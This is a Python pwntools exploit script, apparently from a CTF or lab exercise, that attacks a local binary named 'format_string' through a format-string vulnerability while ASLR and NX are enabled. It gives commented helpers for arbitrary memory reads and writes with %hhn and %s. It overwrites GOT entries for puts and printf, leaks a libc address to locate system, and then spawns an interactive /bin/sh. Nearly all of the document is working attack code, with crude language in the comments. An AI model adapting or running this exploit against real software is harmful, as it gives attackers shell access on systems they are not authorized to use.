#!/usr/bin/env python
# -*- coding: utf-8 -*-
# pasteBin - Jordan Brown 2016
# exploit format string with ASLR and NX
# 
# General approach is to abstract the shit out of everything
# and make each function as robust as possible
# 
# once done, this removes the hassel of being a finikey bitch


from pwn import *

with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	"""
		send a line to the program
		but also save it to 'payload'
		so we can recreate later
	"""
	conn.sendline(line)
	with open('payload', 'a') as f:
		line += '\x0a'
		f.write(line)

def set_cur_val(a):
	"""
		~~~ IMPORTANT ~~
		the %n operator write the number of bytes written so far 
		%hhn writes one byte (0x00 -> 0xff)

		This function returns the minimal payload required
		to print out enough whitespace to get the number
		of characters printed to the desired value

		To do this it uses a global counter called 'current_val'
		which represents the number of bytes written so far
	"""
	global current_val

	# Work out how much whitespace we need to overflow
	# the least significant byte to 0x00
	gets_to_zero = 256 - current_val # add this to get to 0x00

	# then add the amount required to get to the desired value
	gets_to_destination = gets_to_zero + a 

	# since it's 1 byte it doesn't make sense to use more than 256 characters
	inc = gets_to_destination%256 # adding > 256 is the same as adding 0 so mod 256

	# update the number of bytes printed
	current_val = a
	# if we don't have to increment then just return an empty string
	if inc == 0: # %0c is the same as %1c so if it's 0 difference then just print nothing
		return "" 
	return "%1$" + str(inc) + "c" 

def payload_write_data_to_addr(data, addr):
	"""
		Writes 4 bytes of your choice to the address given
		This is the back bone of this exploit

		Finikey as fuck
	"""
	global current_val

	# remove '0x' and convert to little endian
	# 0xaabbccdd -> ddccbbaa 
	# 0x12345678 -> 87654321
	hexStr = hex(data)[2:][::-1] 


	# ddccbbaa -> [dd, cc, bb, aa]
	# 87654321 -> [78, 56, 34, 12]
	byteList = [ hexStr[i:i+2][::-1] for i in xrange(0, len(hexStr), 2) ]

	# convert from hex strings to data
	bytes = [int(x,16) for x in byteList]

	# need to offset the payload by 1 byte
	# took me 3 fucking hours to work that out
	payload = "A" 

	# we are going to write to the 4 bytes of 
	# our address. E.G if we got data:0xa1b2c3d4 addr: 0xffb7aa00
	# we would write the following bytes to the addresses below:
	# 0xffb7aa00 : d4
	# 0xffb7aa01 : c3
	# 0xffb7aa02 : b2
	# 0xffb7aa03 : a1
	# 
	# 0xffb7aa00  == d4c3b2a1
	# (int) * 0xffb7aa00  == 0xa1b2c3d4
	# add our addresses to the start of the format string
	for a in range(len(bytes)):
		payload += p32(addr + a) 

	# this is the offset of the first address in our string
	# it also took a while to work out
	offset = 7 

	# set the number of bytes written to be the current length of
	# our payload
	current_val = len(payload)

	# this takes the a'th byte index of the address you want to 
	# write to, and writes the number of bytes printed there
	write_to_byte = lambda a: "%{0}$hhn".format(a + offset)

	# for each byte, set the least significant byte of the
	# value for the number of bytes written
	# and write that to the address
	for pos, byte in enumerate(bytes):
		payload += set_cur_val(byte) + write_to_byte(pos)

	# return the payload string to use
	return payload

def payload_read_addr(addr):
	"""
		Leak the value at address (addr)
		put it in a print statement in between ':::'
		to make finding it easier
	"""

	# necessary offset
	payload = "A" 

	# just writing the address
	payload += p32(addr)

	# this is the offset of the first address in our string
	offset = 7 
	current_val = len(payload)

	payload += ":::%{0}$s:::".format(offset)

	return payload

def deref(addr):
	"""
		Dereference a pointer
	"""

	# get the value of the pointer you want to dereference
	payload = payload_read_addr(addr)
	send(conn, payload)

	# used to identify the value at the address
	conn.recvuntil(':::'),
	memoryString = conn.recvuntil(':::')[:-3] # grab the data
	conn.recv()
	buff = []
	for char in memoryString[::-1]:
		h = hex(ord(char))[2:]
		if len(h) == 1:
			h = '0' + h
		buff.append(h)
	return buff[-4:]


def stack_leak(offset):
	"""
		Leak an offset value from the stack
	"""
	payload = "%" + str(offset) + "$x"
	send(conn, "AA" + payload + "BB")

	conn.recvuntil('AA'),
	memoryString = conn.recvuntil('BB')[:-2] 
	conn.recv()
	return memoryString

#magicnumbers
puts = 0x08049aec
magical_spot_in_main_function = 0x0804851f # 144
libc_start_main_got = 0x08049af4
printf_got = 0x08049ae0
main_end = 0x08048592
system_offset_into_libc = 150128



# run the process
conn = process('./format_string')
welcome = conn.recvuntil('format string>')
print welcome,

# this is the number of bytes written
# this is manipulated to write arbitrary data using %n
current_val = 0

# Set the puts entry in the GOT to be somewhere in our main funciton
# this puts us in a loop so we can do more formatstrings
payload = payload_write_data_to_addr(magical_spot_in_main_function, puts)
send(conn, payload)
# print conn.recv(),

libc_start = deref(libc_start_main_got)
system = int("0x" + ''.join(libc_start),16) + system_offset_into_libc

payload = payload_write_data_to_addr(system, printf_got)
send(conn, payload)
send(conn, "/bin/sh")

conn.interactive()

# set puts to be the return spot in the main function
payload = payload_write_data_to_addr(main_end, puts)
send(conn, payload)
print conn.recv()

conn.close()



